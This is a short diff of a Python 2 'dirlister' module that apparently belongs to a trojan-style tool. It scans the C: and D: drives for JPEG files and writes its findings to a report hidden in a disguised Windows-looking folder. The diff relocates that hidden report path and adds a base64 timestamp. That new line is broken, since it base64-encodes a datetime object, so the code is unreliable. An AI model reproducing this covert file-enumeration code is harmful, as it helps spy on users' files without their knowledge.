@@ -1,7 +1,8 @@
-import os, datetime, random, fnmatch, threading, time, Queue
+import os, base64, datetime, random, fnmatch, threading, time, Queue
 
-report_name = str(random.randint(1, 100000)) + '.txt'
-report_path = os.path.join('C:\\Windowsx\\aV9sdXZfdQ==\\anVzdGtpZGRpbmc=', report_name)
+ts = base64.b64encode(datetime.datetime.now())
+report_name = str(ts) + '.txt'
+report_path = os.path.join('C:\\Users\\Public\\Windows\\Logs', report_name)
 path_queue = Queue.Queue()
 with open(report_path, 'a') as f:
     f.write("\n" + str(datetime.datetime.now()) + "\n")
@@ -39,7 +40,7 @@ def write_report():
 
 def run(**args):
 
-    print "[*] In dirlister module."
+    print "[*] In DirLister module."
     doc_type = '.jpeg'
     disk1 = 'C:\\'
     disk2 = 'D:\\'
